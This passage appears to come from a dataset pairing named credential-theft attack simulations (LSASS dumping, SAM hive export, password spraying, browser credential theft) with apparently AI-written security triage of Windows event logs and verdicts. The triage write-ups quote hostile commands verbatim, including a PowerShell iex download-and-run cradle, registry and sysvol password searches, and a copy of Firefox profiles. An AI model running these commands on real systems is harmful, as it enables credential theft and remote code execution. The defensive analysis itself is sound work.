3. **Use of `wevtutil.exe`:**
   - Sysmon logs repeatedly show the execution of `wevtutil.exe` by the user `SERVER002\admin_test`. While `wevtutil` is a legitimate utility for interacting with Windows event logs, its use in conjunction with the above PowerShell activity could indicate efforts to tamper with logs or cover tracks.

4. **Execution of System Utilities:**
   - Logs show a series of executions involving `hostname.exe`, `conhost.exe`, and `whoami.exe`. While these are benign utilities, they are often used in conjunction with other commands during reconnaissance or enumeration processes by attackers.

5. **High Integrity Level Processes:**
   - Several processes, including the dubious PowerShell commands, run at a high integrity level, indicating they were likely executed with elevated privileges. This suggests potential privilege escalation or the use of an administrator account for executing malicious commands.

### Assessment:

Based on the collected evidence, the activity predominantly indicates potential compromise or malicious intent:
- The manipulations of system time (`EventID 4616`) and the invocation of PowerShell scripts from an external source, specifically aimed at credential harvesting, are both strong indicators of malicious activity.
- The execution pattern suggests attempts at covering tracks and possibly engaging in reconnaissance to gather sensitive credentials.

### Resolution: MALICIOUS

### Recommendations:
1. **Immediate Response:**
   - Isolate the CEO's machine from the network to prevent further potential data exfiltration or propagation.
   - Conduct a thorough forensic analysis of the system to assess the extent of the compromise and identify any other malicious artifacts or backdoors.
   
2. **Password Reset:**
   - Advise the CEO and any affected users to change their passwords across all sensitive or critical accounts immediately.
   
3. **Security Policies:**
   - Implement policies to restrict PowerShell execution with strong logging and monitoring, especially scripts sourced externally.
   - Monitor for unusual system time changes and execution of system utilities like `wevtutil.exe` and others as potential indicators of compromise.

4. **Review and Harden Privileges:**
   - Review the privileges associated with service accounts and users, ensuring least-privilege access.
   - Audit administrative access and reduce the use of shared accounts.

Password Spray Invoke-DomainPasswordSpray Light,"### Detailed Analysis

Upon analyzing the provided Windows event logs, the following observations and assessments have been made:

#### Suspicious and Anomalous Behaviors

1. **Powershell Execution:**
   - There are several entries involving `powershell.exe` initiated by the user `SERVER002\admin_test`. Notably, a suspicious PowerShell script `Invoke-dpsLight` is executed, designed to test credentials against Active Directory. This behavior is indicative of a password spraying attack, often utilized in lateral movement or discovery phases of a compromise.

2. **Command Line Arguments and Tool Usage:**
   - The suspicious script `Invoke-dpsLight` uses a common password ""Spring2020"" and attempts to verify it against user accounts listed in a file (`usersdpsLight.txt`). This type of script is typically seen in an attack aimed at identifying valid user credentials through automated guessing.

3. **Utilities and Tools Execution:**
   - Multiple executions of standard system utilities like `wevtutil.exe` and `conhost.exe` by the same user (admin_test) are noted. While these executions can be benign, in the context of this investigation, they might support the primary malicious behavior related to credential testing.

4. **High Integrity Level:**
   - The PowerShell session is running with a high integrity level, which suggests that the script has elevated privileges, allowing it to access and manipulate system settings more freely. This increases the risk profile as it could lead to privilege escalation or further network compromise.

#### Indicators of Malicious Activity

- The primary indicator of malicious activity is the PowerShell script's attempt to brute-force user credentials. This action, along with logged executions, suggests an attempt to gain unauthorized access or privilege escalation within the network.
- Given the context and the tool's functionality (credential verification), this is highly suspicious activity usually aligned with network penetration testing, unauthorized auditing, or hostile reconnaissance.

### Assessment and Resolution

Based on the analysis, the observed behaviors are indicative of potentially malicious activity:

- The PowerShell script attempting to test user credentials with a known weak password is a clear indicator of an unauthorized attempt to access user accounts.
- The execution of such a script with high integrity level privileges exacerbates the situation and suggests potential misuse of administrative capabilities.

### Resolution

**Resolution:** **MALICIOUS**

Given the above findings, the activity captured in these logs is highly indicative of malicious intent, specifically targeting unauthorized access and potential lateral movement within the network. Immediate action should be taken.

LaZagne - Credentials from Browser,"Upon analyzing the provided Windows event logs, several observations can be made:

1. **Frequent Usage of Wevtutil and Conhost by a Non-system User:**
   - The user `SERVER002\\admin_test` executed `wevtutil.exe` on multiple occasions (EventRecordID: 18031, 18041, 18044), which is a command-line utility that enables users to retrieve information about event logs and publishers. This can be part of normal administrative duties; however, frequent and script-like invocation can indicate persistence or information-gathering attempts.
   - Additionally, `conhost.exe` was frequently spawned by this user (EventRecordID: 18032, 18042), typically associated with hosting console windows for command line processes.

2. **Execution of Potentially Suspicious Script via cmd.exe:**
   - There is an instance of `cmd.exe` executing a script located in a temporary directory via a command line that contains a path with short-named syntax (EventRecordID: 18055). This is suspicious as scripts located in temporary directories can be associated with malicious activity, especially if the path seems unclear or non-standard.

3. **Execution of Common System Utilities:**
   - The logs show execution of several common Windows utilities such as `whoami.exe`, `hostname.exe`, `svchost.exe`, and `TrustedInstaller.exe`. While these utilities are benign and used for obtaining system and network-related information, their usage frequency, especially `whoami.exe` and `hostname.exe`, suggests reconnaissance activity usually preceding or during unauthorized activity.

4. **Lack of Directly Malicious Indicators:**
   - No specific malware names or known malicious file paths/executables were observed in the logs. Windows Defender appears to be functioning (`SECURITY_PRODUCT_STATE_ON`), suggesting basic protections are in place.

5. **Privilege Levels and Accounts:**
   - The `admin_test` user had high integrity level access, which allows significant control over the system. This user's actions should be verified to confirm they match legitimate administrative tasks.

**Assessment and Resolution:**
The logs contain several suspicious indicators that suggest the need for further investigation, particularly focusing on the `SERVER002\\admin_test` account's activities. While no outright malicious activity is detected, the frequent and potentially script-based use of built-in utilities hints at possible reconnaissance or preparation for more significant actions.

- **Resolution: SUSPICIOUS**

**Guidance:**
1. **Review User Activity:**
   - Confirm the legitimacy of the `admin_test` account and verify whether the activities align with expected administrative tasks.
   
2. **Monitor and Analyze Execution Patterns:**
   - Trace back the execution of the script in the temporary folder to understand its origin and purpose. Check if similar activities align with administrative routines.

3. **Implement Enhanced Logging and Alerts:**
   - Increase logging to capture command-line arguments and script executions for `wevtutil`, `cmd`, and other critical system utilities, while setting up alerts for anomalies.

4. **Conduct a Security Audit:**
   - Review user access controls and privilege allocations to ensure that high-level access is limited to verified administrators only.

This proactive approach will ensure that any potential threat is detected early and mitigated accordingly."

This behavior is suspicious as it could be used to phish for credentials under the guise of a Windows Security Update prompt. The `write-warning $cred.GetNetworkCredential().Password` command is also indicative of an attempt to capture and log passwords using PowerShell.
   - Another suspicious PowerShell command observed is `powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';` and a more complex script involving `{ $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); ... }`. These could be part of a script designed to alter system settings or gather information.

2. **Console Application Executions**:
   - There are frequent executions of system utilities like `whoami.exe`, `hostname.exe`, and `taskhostw.exe`. While these can be part of legitimate administrative tasks, they can also indicate system reconnaissance activities typically seen in cyber-attacks.
   - Multiple `conhost.exe` processes appear to be created alongside these utilities, which is common, but the frequency and consistency may warrant further inspection.

3. **Unusual Process Activity**:
   - `wevtutil.exe` executions suggest potential interaction with Windows event logs. This is sometimes used in attack scenarios to cover tracks by clearing event logs.
   - `powershell.exe` commands attempting to access and manipulate files in the Windows directory hint at potential unauthorized system changes.

4. **Credential Access Attempts**:
   - Event ID 5379 appears, indicating potential credential vault accesses, though not successful due to a return code of 3221226021 which indicates STATUS_ACCESS_DENIED. This indicates an attempt to access credential information was blocked.

5. **Security Privileges**:
   - The presence of events showing privilege escalation (Event ID 4672) for the `SYSTEM` user highlights it may have been used to gain greater access and leverage more permissions, possibly to execute the aforementioned commands.

### Assessment:
The collected logs indicate suspicious activity, particularly the PowerShell executions that prompt for and capture credentials, script executions, and possible reconnaissance. These behaviors suggest potential malicious activity or compromise.

### Resolution:
**SUSPICIOUS** - The logs contain activities that appear irregular and suggest unauthorized actions, but further investigation and corroboration with other data sources would be necessary to determine if these activities are definitively malicious.

Dump LSASS.exe using lolbin rdrleakdiag.exe,"### Detailed Analysis of Windows Event Logs:

#### Suspicious/Anomalous Behavior:
1. **PowerShell Execution:**
   - PowerShell script execution involving the examination of LSASS (Local Security Authority Subsystem Service) process and attempting to create a full memory dump with `rdrleakdiag.exe`. 
   - The use of `get-process lsass` and manipulation to create a memory dump is highly suspicious. Attackers often target LSASS to dump credentials.

2. **Privilege Escalation:**
   - Event ID 4672 indicates special privileges assigned to the user `admin_test`, including `SeDebugPrivilege`, which can be used to debug and potentially tamper with system processes like LSASS.
   - The presence of this privilege and subsequent actions underscore potential malicious intent, as debugging privileges are critical in elevating access and capturing sensitive information.

3. **Security Audit Events:**
   - Event IDs 4634 and 4624 denote logon and logoff events, respectively, for user `admin_test` via NTLM from an external workstation (`DESKTOP-3HL5B2P`).
   - A system process (`wevtutil.exe`) executed under the same user account in Sysmon logs. The `wevtutil` is used to manage event logs, which might indicate log tampering or forensic artifact clearing.

4. **Process Execution Patterns:**
   - Multiple processes (wevtutil, conhost, whoami, hostname) executed sequentially in a short time, often seen in session preparations or enumeration activities post-compromise.
   - Sysmon logs reveal execution of tools that reveal system and user information (`whoami.exe`, `hostname.exe`).

#### Indication of Malicious Activity:
- The attempt to dump LSASS memory (`rdrleakdiag.exe` script via PowerShell) is a strong indicator of malicious credential harvesting.
- The combination of privilege escalation, external IP access, and potential log manipulation enhances suspicion to a high level.

### Assessment:
This analysis surfaces several red flags suggestive of compromised activity:
- The PowerShell script targeting LSASS for memory dumping is a classic tactic used by attackers to exfiltrate credentials.
- The correlation of privilege escalation logs and suspicious process executions (wevtutil) points to a probable compromise.
- Given these indicators, the behavior observed is consistent with typical post-exploitation activities.

Enumeration for Credentials in Registry,"Upon analyzing the provided Windows event logs, some notable activities are observed that could potentially indicate suspicious or malicious activity. Below is a detailed analysis of the events:

### Analysis

1. **Repeated Use of Event Viewer Utility (wevtutil.exe):** 
   - There are multiple instances of `C:\Windows\System32\wevtutil.exe` being executed by the user `SERVER002\admin_test`. This utility is commonly used to query and manipulate event logs. Frequent use without clear justification could suggest suspicious activity.

2. **Registry Query using Command Prompt:**
   - The command line `cmd.exe /c reg query HKLM /f password /t REG_SZ /s & reg query HKCU /f password /t REG_SZ /s` executed by `admin_test` is suspicious. This suggests that there might be an attempt to search for passwords stored in the registry, which is a well-known tactic used by attackers for reconnaissance and information gathering.

3. **`HOSTNAME.EXE` and `WHOAMI.EXE` Execution:**
   - The processes `C:\Windows\System32\HOSTNAME.EXE` and `C:\Windows\System32\whoami.exe` are executed by `admin_test`. While these utilities can be used for gathering system and user information, their use in close succession can suggest an adversary trying to gain information about the system.

4. **Conhost.exe Execution for Every Noted Command:**
   - `C:\Windows\System32\conhost.exe` is linked with the execution of multiple other processes. While not inherently suspicious, having conhost.exe paired with suspicious activities could be further indication of malicious tasks executing through the command prompt or script host.

5. **Potential Lateral Movement or Privilege Escalation:**
   - The logs show multiple instances where the SYSTEM user is being invoked, especially in the Security log displaying elevated tokens and privileges. The SeDebugPrivilege and SeImpersonatePrivilege carry particular risk if misused for privilege escalation attacks.

6. **Service and Process Management Activity:**
   - Multiple processes were initiated under the `NT AUTHORITY\SYSTEM` user, reflecting operational behavior typical for a system service infrastructure; however, it’s critical to assess if these executions were scheduled or expected activities.

"Registry dump of SAM, creds, and secrets","**Detailed Analysis of the Logs:**

1. **Security Log (EventID 4624 and 4672)**:
   - The event with ID 4624 indicates a successful logon event for the SYSTEM account (S-1-5-18) on the machine ""Server002"". This logon is of type 5, which is a service logon. This is typical for processes that run as services on Windows systems and generally benign if found on a server performing expected functionalities.
   - The subsequent event with ID 4672 indicates the SYSTEM account is granted special privileges, common for high-level system processes.

2. **Sysmon Logs (EventID 1 and 5)**:
   - **TrustedInstaller.exe** and **TiWorker.exe** processes appear normal for Windows, often related to Windows Update or module installations.
   - Execution of `whoami.exe` and `hostname.exe` with a high integrity level is generally benign. However, these can be suspicious in tightly monitored environments if not expected to be executed by a user account like `admin_test`.
   - The execution of `cmd.exe` with command line arguments for saving the SAM, System, and Security registry hives into temporary locations raises a red flag. This behavior is often associated with credentials dumping or attempts to access sensitive system data that could be leveraged for privilege escalation or pivoting within a network.
   - Multiple executions of `reg.exe` following the `cmd.exe` instance imply the actual saving of registry hives. This behavior requires elevated privileges and is suspicious without explicit approved requirements.

3. **System Log (EventID 15)**:
   - This event shows a resize operation on the COMPONENTS hive within the System32 configuration, which is common during regular system updates or maintenance and does not indicate malicious activity by itself. 

**Assessment:**

- **Suspicious Activity**: The sequence of the `cmd.exe` execution saving crucial registry hives (SAM, system, and security) to temporary locations is indicative of potentially malicious activity, typically associated with attempts at gathering sensitive credentials or state information from a machine. Given the absence of a legitimate reason from the logs for this operation, it marks a notable security concern.

**Resolution:**

- **SUSPICIOUS**: While some activities like the execution of `whoami.exe` and `hostname.exe` are benign, the suspicious command-line activities involving `cmd.exe` and registry hive saves need more investigation. These could be signs of a deeper intrusion attempt, necessitating a thorough check for any unauthorized access or escalation activities on the network. It is advisable to verify if these actions were approved or if any anomalies coincide with this period.

**Guidance to Proceed:**

1. Conduct a deeper investigation into the purpose and authorization for the registry hive exports.
2. Check for any anomalies in user account activities on ""Server002"" around the same time.
3. Verify all scheduled or recent administrative actions by `admin_test`.
4. Assess if other systems on the network have exhibited similar behavior.
5. Audit server policies to detect and prevent similar unauthorized actions, including enhancing logging and alert mechanisms for such registry accesses.
6. Consider isolating the system for forensic examination and to prevent potential lateral movement by a threat actor."
GPP Passwords (findstr),"Upon reviewing the provided Windows event logs, I have identified several activities that warrant further scrutiny. Here's the analysis:

1. **Time Change Events**: 
   - Security events and system logs indicate several timestamps change (`EventID: 4616`), where the system time was adjusted multiple times. Although this could be legitimate if initiated by system updates or time synchronization services, frequent time changes can sometimes indicate an attempt to manipulate event timestamps for malicious activity hiding.

2. **Services Stopping**:
   - In the application logs, there are events related to the ""edgeupdate"" service stopping. This can be normal if the service was shutting down after completing its task. However, repeated stopping without expected corresponding starting events can be indicative of service abnormalities that might need further checking.

3. **Suspicious Command Execution**:
   - Sysmon logs reveal the execution of `cmd.exe` with parameters searching for ""cpassword"" in `\\sysvol\\*.xml` (EventID: 1). This can be malicious, as it suggests someone might be trying to extract stored credentials from Group Policy Preferences. Additionally, several `whoami.exe` queries and `hostname.exe` executions are logged. While they aren't inherently malicious, frequent use can be suspicious if not typical for the user.

4. **Use of System Tools**:
   - The frequent invocation of native tools like `powershell.exe`, `wevtutil.exe`, and `conhost.exe` by a non-system user account (`admin_test`) may suggest activity worth investigating further, especially in the absence of legitimate administrative tasks explanation.

5. **Edge Update Activities**:
   - The Sysmon log details extensive execution of Microsoft Edge Update processes. While updating processes can seem normal, the rapid and numerous executions with various command-line arguments in a short time (event IDs like ""17999"" to ""18024"") might require examination to ensure no exploitation or unusual update attempt is underway.

**Assessment**:
- The overall activity log exhibits behaviors that could be commonly seen in either typical administrative tasks or potential security risks.
- The continuous use of administrative-level tools and commands alongside multiple time adjustments implies potential attempts to obscure actions.

**Resolution**: **SUSPICIOUS**
- While there are possible explanations for the activities observed, the nature of command-line executions and time changes calls for a deeper investigation to rule out any malicious actions or compensatory changes in the environment.

**Guidance**:
- Investigate the purpose and authorization for the use of commands performing sensitive operations (such as `findstr` on ""cpassword"").
- Review user `admin_test` activities and reasons for utilizing PowerShell and command-line tools.
- Examine Edge update history and assess if any tools have been tampered with.
- Verify whether the time changes were legitimately performed by an authorized time synchronization process or administrator.
- Increase monitoring on `Server002` for any further unusual activities or alerts.

In summary, while there are indicators of suspicious activity, further confirmation and deeper analysis would be necessary to conclude malicious intent."
WinPwn - PowerSharpPack - Sharpweb for Browser Credentials,"Upon analyzing the provided Windows event logs, several indicators of potentially malicious activity have been identified. These findings include suspicious process executions and command-line arguments, which suggest a compromise:

1. **PowerShell Activity**:
   - Repeated instances of PowerShell executing with the following command line:
     ```powershell
     powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/master/scriptBinaries/Invoke-script.ps1')}
     ```
   - This PowerShell execution attempts to download and run a script from an external source. The use of `iex` (Invoke-Expression) to execute a command string fetched over the internet is a known technique used by attackers to execute potentially malicious scripts. This is highly suspicious and indicative of possible compromise.

2. **Sysmon Logs**:
   - Various processes such as `whoami.exe`, `hostname.exe`, and `wevtutil.exe` are executed multiple times. These processes, particularly when seen frequently in conjunction with each other, may indicate reconnaissance or manipulation of system logs by an adversary.
   - The execution of `WindowsPowerShell` with a suspicious command line, corroborates the act of downloading and executing potentially malicious scripts.

3. **EdgeUpdate Processes**:
   - Numerous instances of `MicrosoftEdgeUpdate.exe` and related processes executing with command lines that include update and registration parameters. While these could be legitimate updates, they align temporally with the suspicious PowerShell activity. This warrants further scrutiny to confirm its legitimacy.

Based on the information above, the logs reveal activities consistent with reconnaissance and unauthorized execution of remote scripts via PowerShell. While network interactions involving downloading scripts from GitHub are inherently risky, in this context, they suggest direct compromise.

**Assessment**: Given the use of PowerShell to download and execute a script from an unknown and potentially unauthorized source, I categorize this activity as **MALICIOUS**.

**Guidance on how to proceed**:
1. **Immediate Containment**: Isolate the affected machine from the network to prevent further compromise.
2. **Detailed Analysis**: Perform a deeper forensic analysis of the affected system. Check for additional indicators such as other unauthorized downloads, registry changes, or file creation that may flesh out the attack timeline.
3. **Incident Response**: Engage with your incident response team to contain and mitigate the spread of any potential malware.
4. **Revise Policies**: Review security policies and consider implementing more stringent controls over PowerShell execution on high-profile users like the CEO.
5. **Threat Hunting**: Investigate other systems within the network for similar indicators of compromise that may have propagated through lateral movement or similar attack vectors."
WinPwn - passhunt,"Based on the detailed analysis of the provided logs, here are the key findings and assessment:

### Anomalous Behavior Observed:

1. **Time Change Events**: The logs show a Windows Time Service event indicating synchronization with an external time source `time.windows.com`, which is normal behavior, but there are multiple successive Kernel-General events for time change within milliseconds. These seem to align with normal system time adjustments based on synchronization, but their frequency may warrant a review if they are unexpected.

2. **PowerShell Activity**: There are several Sysmon events and corresponding PowerShell logs that indicate the execution of a PowerShell script directly from a remote URL:
   - The command executed via PowerShell attempts to download a script from `https://raw.githubusercontent.com/.../script.ps1`.
   - This behavior is highly indicative of a potentially malicious action, as it’s common for attackers to use PowerShell for downloading and executing scripts from remote locations.

3. **High Privilege Logons**: The security log reveals multiple logon events using NTLM authentication with high privileges such as `SeDebugPrivilege`. The user `admin_test` appears to have performed activities repeatedly using different logon IDs. There is a focus on privilege escalation given the listed privileges.

4. **Execution of System Utilities**: Execution of native utilities like `whoami.exe` and `hostname.exe` as seen in the Sysmon logs is typically associated with information gathering, often used by attackers during the reconnaissance phase after gaining access.

### Potential Threats or Risks Identified:

- The PowerShell execution indicates a risk of Remote Code Execution (RCE) as it pulls a script from an untrusted external source, marking a significant potential for system compromise.
- The presence of suspicious logins and privilege use may suggest credential compromise or lateral movement attempts within the environment.
- Execution of reconnaissance utilities suggests possible mapping of system environment which is often followed by further exploitation activities.

### How to Proceed:

- Isolate the affected machine if possible to prevent further propagation.
- Conduct a thorough investigation to identify any downloaded script or malware artifacts in the system, especially those related to the PowerShell invocation.
- Review user account `admin_test` for any unauthorized access patterns or changes and consider resetting passwords, revising permissions.
- Assess firewall and antivirus settings and scanning logs to confirm if the PowerShell script was flagged previously.
- Encourage use of stricter execution policies for PowerShell and block access to URLs known for distributing malicious content.
- Educate users on phishing and email security as it may be the initial vector.

**Resolution**: **MALICIOUS** - The logs contain malicious activity indicators especially with the execution of externally sourced PowerShell scripts and suspicious privilege escalation attempts. Immediate attention is advised to contain and remediate potential threats."
Search for Passwords in Powershell History,"## Analysis of Windows Event Logs

Upon reviewing the provided logs, several key observations and anomalies have been identified, which suggest potential suspicious activity on the host system. Below is a detailed breakdown of my findings:

### Security Log
- **Event ID 4616 (System Time Change)**: This event suggests a change in the system time. There are two entries indicating that the system time was synchronized backward. Frequent and unexplained system time changes can be a tactic used by malware to evade detection or bypass time-based protections.
- **Process Name**: `svchost.exe` is shown for the time changes, which is a legitimate Microsoft service, but its activity should be monitored when related to suspicious events.

### System Log
- **Kernel General and Time Service Events**: The logs document time adjustments, which appear consistent with the time changes noted above. Again, this is a potential indicator of suspicious behavior, as legitimate time changes are usually consistent with daylight saving adjustments or NTP synchronization.

### Sysmon Log
- **Process Execution**: Several processes like `whoami.exe`, `hostname.exe`, and `powershell.exe` with command-line parameters were executed by the user `admin_test`. Such utilities are commonly used by attackers for reconnaissance purposes.
- **Specific PowerShell Command**: PowerShell was used to search within `PSReadLine` history for keywords like `""password""`, `""-p""`, `""key""`, `""pwd""`, and `""pass""`. This indicates an intent to locate stored sensitive information, which is highly suspicious.
- **Process Hierarchies**: The processes `wevtutil.exe` and `EdgeUpdate.exe` seen running under SYSTEM user are legitimate, but the frequency and nature of EdgeUpdate's command-line arguments suggest potentially automatic updates or misuse for persistence/installing software.

### Windows PowerShell Log
- **HostApplication Field**: The command being run in the logs corresponds to the suspicious PowerShell command found in Sysmon logs, confirming that it indeed executed and was not a random artifact.

### Application Log
- **EdgeUpdate Service**: Logs indicate service start/stop actions, which could signal either regular update behavior or, if superfluous, malicious trying to blend in with regular system activity.

### Assessment
- The primary indicator of potential malicious activity is the suspicious PowerShell command executed by the user `admin_test`. This command attempts to parse through PowerShell history files for indications of sensitive data such as passwords which could be an indication of credential harvesting efforts.
- System time alterations without proper context can also be a red flag. The frequent and possibly unnecessary adjustment could suggest evasion techniques.
  
### Conclusion

The activity described in the logs exhibits characteristics that are consistent with suspicious behavior. Particularly the PowerShell script usage strongly suggests possible malicious intent likely aimed at extracting sensitive information.

**Resolution**: **SUSPICIOUS**

### Guidance on How to Proceed
1. **Immediate Monitoring**: Increase monitoring on the systems involved, especially focusing on PowerShell usage and network connections established by the host.
2. **User Account Review**: Conduct a thorough review of user accounts and their recent activities on the involved system. Change credentials if suspicion of compromise extends to credentials.
3. **Endpoint Investigation**: Utilize endpoint detection response (EDR) tools to investigate whether the activity chain indicates deployment or installation of additional malicious artifacts.
4. **Time Change Monitoring**: Confirm whether the time changes were legitimate or if there are signs of tamper-based activity.
5. **Security Awareness**: Notify the users of suspicious activities and educate them on recognizing potential phishing or social engineering attacks."
Azure - Dump All Azure Key Vaults with Microburst,"Upon analysis of the provided logs, several observations can be made regarding potential indicators of malicious activity:

1. **Account Privilege Use**:  
   - Event ID 4672 from the Security log indicates that the user `admin_test` was granted several high-level privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others typically used by system administrators. While not inherently malicious, excessive or unexpected use of such privileges may warrant further investigation.

2. **Suspicious PowerShell Activity**:  
   - In the Sysmon log, there's a significant PowerShell command execution detailed in Event ID 1 where a script `Get-AzurePasswords.ps1` is being imported and executed. The script appears to be attempting to retrieve Azure passwords. Such an action, particularly on a CEO’s machine, without explicit purpose, is a strong indicator of potentially malicious or unauthorized activity.

3. **Multiple Process Creations**:  
   - There are numerous instances of processes like `wevtutil.exe` and `conhost.exe` being repeatedly executed in quick succession. While not uncommon in themselves, the context and combined presence with other suspicious activities may raise concerns.

4. **Use of NTLM Authentication**:  
   - In the Security logs, the logon type is shown as 3 (network logon) with NTLM authentication, which might suggest remote access. Coupled with elevated privileges, this behavior may indicate lateral movement within the network or unauthorized remote control.

5. **Unexpected Command-Line Arguments**:  
   - The PowerShell scripts executed have complex command-line arguments, including the conversion of strings to secure strings and connection attempts to an Azure account, which may signify attempts to retrieve sensitive information.

Guidance and Resolution:
- Thoroughly review the usage and necessity of the administrative privileges assigned to the `admin_test` account. Ensure that all usage was authorized and in line with organizational policy.
- Investigate the origin and purpose of the `Get-AzurePasswords.ps1` PowerShell script, as well as who authorized its execution and any resultant actions taken by it.
- Conduct a full forensic analysis of the device to ascertain any further signs of compromise, specifically looking for data exfiltration attempts or other unauthorized access patterns.
- Validate any network connection attempts between `Server002` (the analyzed host) and external or internal systems, particularly looking for unusual or unauthorized connections.

Final Resolution: **MALICIOUS**  
The presence of possibly credential-stealing PowerShell commands, coupled with potentially unauthorized privileged use and behavior indicating unauthorized remote access, suggests a high likelihood of malicious activity. Immediate action is recommended to mitigate potential risks."
Simulating access to Windows Firefox Login Data,"Based on the provided log entries, there are several points of potential concern observed in the activities logged for the host ""Server002"". Let's delve into each type of event log separately for a detailed assessment.

### Windows PowerShell Log

The PowerShell logs reveal the execution of the following command:

```powershell
powershell.exe & {Copy-Item ""$env:APPDATA\Mozilla\Firefox\Profiles\"" -Destination ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles"" -Force -Recurse}
```

- **Analysis**: This command attempts to copy the Firefox profiles folder to a temporary location. Such activity can be suspicious as it might indicate an attempt to exfiltrate cookies, stored passwords, or browsing history for credential harvesting.
- **Impact**: If unauthorized, this could represent a data breach attempt or preparation for credential theft.

### Security Log

The Security log shows a logon event with the following details:

- **Event ID 4624**: Successful logon by the user ""SYSTEM"", Logon Type 5 (Service logon), through Advapi – which is generally benign as it relates to system service operations.
- **Event ID 4672**: Special privileges assigned to a new logon, indicating elevated token privileges granted to ""SYSTEM"". Again, this is typical for system accounts but could be leveraged by an attacker if they gain control over system processes.

### Sysmon Log

The Sysmon logs capture several processes executions, most notably:

- **Powershell.exe execution** coinciding with the suspicious action identified in the PowerShell logs.
- Frequent use of **wevtutil.exe** and **conhost.exe** by the user ""admin_test"", which could reflect an attempt to manipulate or assess Windows event logs, often indicative of malicious activity aiming to cover tracks or explore audit trails.
- The employment of **whoami.exe** and **hostname.exe** may suggest reconnaissance efforts to determine logged-on users and the machine name, typical actions during a compromise.
- The presence of **TiWorker.exe**, associated with Windows updates, but its timing could obscure other activities.

### Conclusion and Resolution

**Resolution**: **SUSPICIOUS**

- **Justification**: The copy operation of Firefox profiles via PowerShell, combined with potentially anomalous log manipulation utility usage (e.g., wevtutil), and typical reconnaissance commands (e.g., whoami, hostname) suggest potentially unauthorized activity. However, there's no direct evidence from these logs alone that provides conclusive indicators of a known malware or a definitive compromise.
  
### Recommendations

1. **Further Investigation**: Conduct a thorough investigation into the user ""admin_test"" activities, including user correspondences, and cross-reference usage logs.
2. **Network Traffic Analysis**: Check for any unusual or unauthorized outbound connections from ""Server002"", particularly around the time these activities were logged.
3. **File Integrity Check**: Verify if the copied data from Firefox profiles is still present or if it was manipulated/removed.
4. **Endpoint Security Measures**: Conduct a full endpoint security scan on ""Server002"" to detect any potentially illicit processes or residual malware signatures.
5. **Audit and Review**: Consider setting up alerts for similar PowerShell activities across your network with strict auditing policies for privileged account actions. 

This review should adequately assess any risks posed by the activity and help tighten security measures on potentially compromised endpoints."
Azure - Dump Azure Instance Metadata from Virtual Machines,"Upon analyzing the provided Windows event logs, the following observations and conclusions can be made:

### Suspicious or Anomalous Behavior
1. **PowerShell Activity**: 
   - The PowerShell logs indicate the execution of a script with `Invoke-RestMethod` to retrieve metadata from a non-standard local address, `http://169.254.169.254`. This address is commonly used in cloud environments like Azure and AWS to fetch instance metadata, often targeted by attackers seeking sensitive information in these environments.
   - The command in question uses `Invoke-RestMethod` with headers and outputs to a file in the temporary directory, which can be indicative of data collection or reconnaissance activities.

2. **Unusual Process Executions**:
   - `whoami.exe` and `hostname.exe` executions can be considered standard if examined in a routine context. However, when combined with the PowerShell activity, these could be indicative of an actor verifying system and user information in preparation for further actions.

3. **Wevtutil Usage**:
   - The frequent execution of `wevtutil.exe` could imply log manipulation or attempt to clear or query logs to cover tracks, which is consistent with post-compromise behavior.

### Indicators of Malicious Activity or Compromise
- **Data Exfiltration or Reconnaissance**: The PowerShell command line involving `Invoke-RestMethod` suggests potential for reconnaissance or data exfiltration, especially in a cloud environment due to the use of 169.254.169.254 for metadata access.
- **Potential Evasion Tactics**: The use of `wevtutil.exe` could imply efforts to manipulate event logs to evade detection.

### Assessment of the Situation
Based on the information provided, the logs show suspicious PowerShell activity that could indicate reconnaissance or initial stages of an attack targeting cloud infrastructure. The use of specific tools and methodologies, such as PowerShell and metadata querying, supports this hypothesis. The behavior of executing system commands and the potential use of `wevtutil.exe` for log manipulation suggests a need for further investigation.

### Resolution
- **SUSPICIOUS**: The logs contain activity that does not appear benign and necessitates further investigation to confirm if the activity is malicious. 

### Guidance on How to Proceed
1. **Immediate Monitoring and Investigation**: Increase monitoring on the involved host, `Server002`, and check for other similar activities across the network.
2. **Log Analysis**: Analyze logs prior and post these events to see if further anomalous behavior escalates.
3. **Network Activity**: Examine outbound network traffic to identify communication with potentially malicious remote servers.
4. **Threat Hunt**: Conduct a threat hunt within the network focusing on known IoCs related to cloud metadata exploits and misuse of `wevtutil` and PowerShell.
5. **User Verification**: Verify the legitimacy of the user account `SERVER002\\admin_test` involved in these activities.
6. **Environment Verification**: Determine if `Server002` is part of a cloud-hosted infrastructure and assess access permissions to sensitive metadata and resources.

Overall, while definitive malicious intent cannot be concluded solely from the logs, the activities observed warrant a cautious approach and further detailed investigation."
Access unattend.xml,"After analyzing the provided Windows event logs, there are several details and patterns worth noting:

1. **Microsoft Edge Update Executions**: There are multiple process creation events related to `MicrosoftEdgeUpdate.exe`, some of which are executed from temporary directories:
   - `C:\Program Files (x86)\Microsoft\Temp\EU6111.tmp\MicrosoftEdgeUpdate.exe`
   - This might be typical of update processes temporarily storing executable files during an update. However, running executables from temporary or non-default directories could also indicate an attempt to disguise malicious activities.

2. **Command Execution via CMD**: 
   - An instance of `cmd.exe` was executed to read the contents of `unattend.xml` files:
     ```
     CommandLine: ""cmd.exe"" /c type C:\Windows\Panther\unattend.xml & type C:\Windows\Panther\Unattend\unattend.xml
     ```
   - This type of behavior can be suspicious if it’s not typical for user behavior, as it may suggest reconnaissance or an attempt to read sensitive information stored in the unattend.xml file, which can sometimes contain configuration details.

3. **Multiple Instances of `wevtutil.exe` and `conhost.exe`**:
   - Numerous events showing the execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`:
     - `wevtutil.exe` is a legitimate utility to manage event logs, but it can be used to clear logs or for other purposes in a malicious context.
     - The frequency and combination of these processes might suggest, at minimum, extensive log querying or modifications.

4. **System Integrity and Time Changes**:
   - The logs show changes in the system time, which could be benign, but time alterations can sometimes be used to mask activities in logs.

5. **General User and Process Behavior**:
   - Consistent high integrity level processes and several executed processes under `SERVER002\admin_test` indicate administrative activity, which may not be unusual if this user is expected to perform administrative duties, but it can also be a vector for privilege misuse.

### Assessment:

